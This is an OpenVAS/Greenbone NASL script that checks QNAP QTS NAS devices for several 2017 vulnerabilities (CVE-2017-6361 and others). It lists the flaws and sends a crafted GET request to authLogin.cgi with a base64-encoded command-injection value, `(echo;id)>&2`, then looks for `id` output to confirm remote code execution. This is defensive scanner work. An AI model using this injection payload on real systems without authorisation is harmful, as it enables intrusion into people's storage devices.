# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:qnap:qts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140238");
  script_version("2024-08-08T05:05:42+0000");
  script_tag(name:"last_modification", value:"2024-08-08 05:05:42 +0000 (Thu, 08 Aug 2024)");
  script_tag(name:"creation_date", value:"2017-04-07 11:52:09 +0200 (Fri, 07 Apr 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2017-5227", "CVE-2017-6361", "CVE-2017-6360", "CVE-2017-6359");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("QNAP QTS < 4.2.4 Build 20170313 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_qnap_nas_http_detect.nasl");
  script_require_ports("Services/www", 80, 8080);
  script_mandatory_keys("qnap/nas/http/detected");

  script_tag(name:"summary", value:"QNAP QTS web user interface is prone to multiple
  vulnerabilities");

  script_tag(name:"vuldetect", value:"Try to execute the `id` command by sending a special crafted
  HTTP GET request.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - CVE-2017-5227: Local users cat obtain sensitive Domain Administrator password information by
  reading data in an XOR format within the /etc/config/uLinux.conf configuration file.

  - SQL injection, command injection, heap overflow, cross-site scripting, and three stack overflow
  vulnerabilities

  - CVE-2017-6361, CVE-2017-6360, CVE-2017-6359: Command injection

  - Access control vulnerability that would incorrectly restrict authorized user access to resources.

  - Two stack overflow vulnerabilities that could be exploited to execute malicious codes reported

  - Clickjacking vulnerability that could be exploited to trick users into clicking malicious links

  - Missing HttpOnly Flag From Cookie vulnerability that could be exploited to steal session cookies.

  - SNMP Agent Default Community Name vulnerability that could be exploited to gain access to the
  system using the default community string.

  - NMP credentials in clear text vulnerability that could be exploited to steal user credentials.

  - LDAP anonymous directory access vulnerability that could be exploited to allow anonymous
  connections.");

  script_tag(name:"solution", value:"Update to QTS 4.2.4 Build 20170313 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/97059");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/97072");
  script_xref(name:"URL", value:"https://sintonen.fi/advisories/qnap-qts-multiple-rce-vulnerabilities.txt");
  script_xref(name:"URL", value:"https://www.qnap.com/en/support/con_show.php?cid=113");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if ( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

t = ( unixtime() % 100000000 );

rmessage = base64( str: "QNAPVJBD" + t + '      Disconnect  14`(echo;id)>&2`' );

url = dir + "/cgi-bin/authLogin.cgi?reboot_notice_msg=" + rmessage;

if( buf = http_vuln_check( port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+", check_header:TRUE ) ) {
  report = 'It was possible to execute the `id` command on the remote host.\n' +
           http_report_vuln_url(  port:port, url:url ) +
           '\n\nResponse:\n\n' + buf;
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
